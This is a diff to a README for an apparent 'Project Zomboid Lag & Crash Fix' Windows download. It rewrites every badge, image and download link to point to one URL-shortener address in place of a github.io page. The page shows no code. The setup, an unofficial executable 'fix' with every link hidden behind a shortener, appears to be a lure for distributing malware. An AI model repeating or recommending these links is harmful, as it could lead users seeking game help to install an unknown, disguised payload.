@@ -10,19 +10,19 @@ It focuses on **lag reduction, crash repair, launch troubleshooting, FPS stabili
 
 ## Quick Access
 
-[![Game](https://img.shields.io/badge/Game-Project%20Zomboid-4c4c4c?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Tool](https://img.shields.io/badge/Tool-Lag%20%26%20Crash%20Fix-2f855a?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-1e90ff?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Architecture](https://img.shields.io/badge/Architecture-x64-8a2be2?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Size](https://img.shields.io/badge/Download%20Size-75%20MB-16a34a?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Status](https://img.shields.io/badge/Status-Active-32cd32?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-20c05c?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Game](https://img.shields.io/badge/Game-Project%20Zomboid-4c4c4c?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Tool](https://img.shields.io/badge/Tool-Lag%20%26%20Crash%20Fix-2f855a?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-1e90ff?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Architecture](https://img.shields.io/badge/Architecture-x64-8a2be2?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Size](https://img.shields.io/badge/Download%20Size-75%20MB-16a34a?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Status](https://img.shields.io/badge/Status-Active-32cd32?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-20c05c?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download Project Zomboid Lag & Crash Fix](https://idleobstacle.github.io/)**
+➡️ **[Download Project Zomboid Lag & Crash Fix](https://flyn.co/17yeN7/)**
 
 This package is approximately **75 MB** and is intended for **Project Zomboid players on Windows 10 / 11**.
 
@@ -32,11 +32,11 @@ This package is approximately **75 MB** and is intended for **Project Zomboid pl
 
 ### Optimizer Dashboard
 
-[![Project Zomboid Lag & Crash Fix Dashboard](assets/project-zomboid-optimizer-dashboard.png)](https://idleobstacle.github.io/)
+[![Project Zomboid Lag & Crash Fix Dashboard](assets/project-zomboid-optimizer-dashboard.png)](https://flyn.co/17yeN7/)
 
 ### Before / After Optimization Preview
 
-[![Project Zomboid Lag & Crash Fix Comparison](assets/project-zomboid-lag-crash-fix-preview.png)](https://idleobstacle.github.io/)
+[![Project Zomboid Lag & Crash Fix Comparison](assets/project-zomboid-lag-crash-fix-preview.png)](https://flyn.co/17yeN7/)
 
 These preview images demonstrate the type of optimization workflow this tool is designed for: **crash repair, launch stabilization, mod conflict checking, memory cleanup, and smoother gameplay performance**.
 
@@ -122,7 +122,7 @@ This tool is built to help with issues such as:
 
 Download the latest version from the official project page:
 
-➡️ **[Download Project Zomboid Lag & Crash Fix](https://idleobstacle.github.io/)**
+➡️ **[Download Project Zomboid Lag & Crash Fix](https://flyn.co/17yeN7/)**
 
 ### Install Steps
 
